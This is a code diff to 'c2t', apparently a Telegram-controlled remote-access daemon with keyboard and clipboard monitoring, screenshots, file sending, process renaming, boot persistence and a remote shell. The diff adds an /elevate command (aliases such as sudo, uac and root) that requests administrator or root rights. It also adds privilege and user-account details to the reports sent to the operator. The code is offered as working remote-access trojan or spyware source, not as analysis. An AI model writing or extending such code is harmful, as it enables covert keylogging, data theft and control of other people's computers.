@@ -234,6 +234,7 @@ typedef enum {
   CMD_SESSION_STATUS,
   CMD_RUNFILE,
   CMD_SHELL_HELP,
+  CMD_ELEVATE,
   CMD_HELP
 } c2t_cmd_id_t;
 
@@ -310,6 +311,7 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"sh_status", CMD_SESSION_STATUS}, {"session_status", CMD_SESSION_STATUS}, {"shell_status", CMD_SESSION_STATUS},
   {"runfile", CMD_RUNFILE}, {"execfile", CMD_RUNFILE}, {"runscript", CMD_RUNFILE}, {"exec_file", CMD_RUNFILE}, {"run_file", CMD_RUNFILE}, {"script", CMD_RUNFILE},
   {"shell_help", CMD_SHELL_HELP}, {"sh_help", CMD_SHELL_HELP}, {"shhelp", CMD_SHELL_HELP}, {"shellhelp", CMD_SHELL_HELP},
+  {"elevate", CMD_ELEVATE}, {"admin", CMD_ELEVATE}, {"sudo", CMD_ELEVATE}, {"uac", CMD_ELEVATE}, {"getadmin", CMD_ELEVATE}, {"privilege", CMD_ELEVATE}, {"privileges", CMD_ELEVATE}, {"root", CMD_ELEVATE},
   {"help", CMD_HELP}
 };
 
@@ -756,18 +758,24 @@ int telegram_send_start_info(void) {
     escape_html_str(config->proxy, proxy_str, sizeof(proxy_str));
   }
 
+  char shell_status_str[128] = {};
+  c2t_shell_get_status_info(shell_status_str, sizeof(shell_status_str));
+  const char *priv_str = c2t_runtime_get_privilege_str();
+
   char msg[3800];
   snprintf(
       msg, sizeof(msg),
       "🚀 <b>c2t Daemon Online</b>\n\n"
       "💻 <b>Host System:</b>\n"
       "• <b>User &amp; Host:</b> <code>%s@%s</code>\n"
+      "• <b>Privileges:</b> %s\n"
       "• <b>OS &amp; Kernel:</b> %s\n"
       "• <b>Local IP:</b> <code>%s</code>\n"
       "• <b>Process:</b> <code>%s</code> (PID: <code>%lu</code>)\n"
       "• <b>Version:</b> <code>v%s</code>\n"
       "• <b>Role:</b> %s\n\n"
       "⚙️ <b>Active Subsystems:</b>\n"
+      "• 💻 <b>Shell Engine:</b> %s\n"
       "• 📋 <b>Clipboard:</b> %s\n"
       "• ⌨️ <b>Keyboard:</b> %s\n"
       "• 📸 <b>Screenshots:</b> %s\n"
@@ -775,8 +783,9 @@ int telegram_send_start_info(void) {
       "• 📁 <b>File Operations:</b> %s\n"
       "• 🔒 <b>Crypto:</b> <code>%s</code>\n"
       "• 🌐 <b>Proxy:</b> <code>%s</code>\n\n"
-      "💡 <i>Use <code>/help</code> for available commands or <code>/status</code> for live stats.</i>",
-      user, host, os_str, ip_str, proc_name, pid, C2T_VERSION, role_str,
+      "💡 <i>Use <code>/help</code> for available commands, <code>/shell_help</code> for shell guide, or <code>/status</code> for live stats.</i>",
+      user, host, priv_str, os_str, ip_str, proc_name, pid, C2T_VERSION, role_str,
+      shell_status_str,
       clip_detail, kb_detail, shot_detail,
       config->telegram_send_logs ? "🟢 Periodic" : "⚪ On-demand (/logs)",
       config->telegram_send_files ? "🟢 Enabled" : "❌ Disabled", esc_crypto,
@@ -1723,6 +1732,13 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_ELEVATE: {
+    char elev_msg[1024] = {};
+    (void)c2t_runtime_request_elevation(elev_msg, sizeof(elev_msg));
+    telegram_send_html(elev_msg);
+    break;
+  }
+
   case CMD_LOGS: {
     c2t_log_info("listener", "Flushing logs on-demand by /logs command");
     c2t_log_sender_dispatch_now();
@@ -2105,10 +2121,18 @@ static void handle_command(const telegram_incoming_update_t *update,
     format_metric_bytes(shell_bytes, shell_b_str, sizeof(shell_b_str));
     format_metric_bytes(total_transferred, tot_b_str, sizeof(tot_b_str));
 
+    char raw_u[64] = {};
+    c2t_runtime_get_username(raw_u, sizeof(raw_u));
+    char user_acc[128] = {};
+    escape_html_str(raw_u, user_acc, sizeof(user_acc));
+    const char *priv_lvl = c2t_runtime_get_privilege_str();
+
     char status_msg[2000];
     snprintf(status_msg, sizeof(status_msg),
              "🤖 <b>c2t Daemon Status</b>\n\n"
              "• <b>Status:</b> 🟢 Active &amp; Running\n"
+             "• <b>Privileges:</b> %s\n"
+             "• <b>User Account:</b> <code>%s</code>\n"
              "• <b>Clipboard Monitoring:</b> %s\n"
              "• <b>Keyboard Monitoring:</b> %s\n"
              "• <b>Keyboard Target:</b> <code>%s</code> (Mode: %s)\n"
@@ -2126,6 +2150,7 @@ static void handle_command(const telegram_incoming_update_t *update,
              "• 📁 <b>Files:</b> %s (%llu files sent)\n"
              "• 📜 <b>Logs:</b> %s (%llu flushes)\n\n"
              "📦 <b>Queue Limits:</b> %llu items / %llu MB",
+             priv_lvl, user_acc,
              clip_status, kb_status, kb_target,
              kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text",
              shot_status, (unsigned long long)screenshot_get_interval(),
@@ -2293,7 +2318,8 @@ static void handle_command(const telegram_incoming_update_t *update,
         "💡 <b>c2t Telegram Commands</b>\n\n"
         "<b>Core Controls:</b>\n"
         "• <code>/info</code> (or <code>/start</code>) - View host info &amp; startup summary\n"
-        "• <code>/status</code> - View daemon status &amp; throughput state\n"
+        "• <code>/status</code> - View daemon status, privileges &amp; throughput state\n"
+        "• <code>/elevate</code> (or <code>/admin</code>, <code>/sudo</code>, <code>/uac</code>) - Request Administrator / root elevation\n"
         "• <code>/process_name [name]</code> (or <code>/rename</code>, <code>/procname</code>) - View or change process name\n"
         "• <code>/install [enable|remove|status]</code> (or <code>/autostart</code>) - Configure startup on boot/login\n"
         "• <code>/uninstall</code> - Remove startup service / registry entry\n"
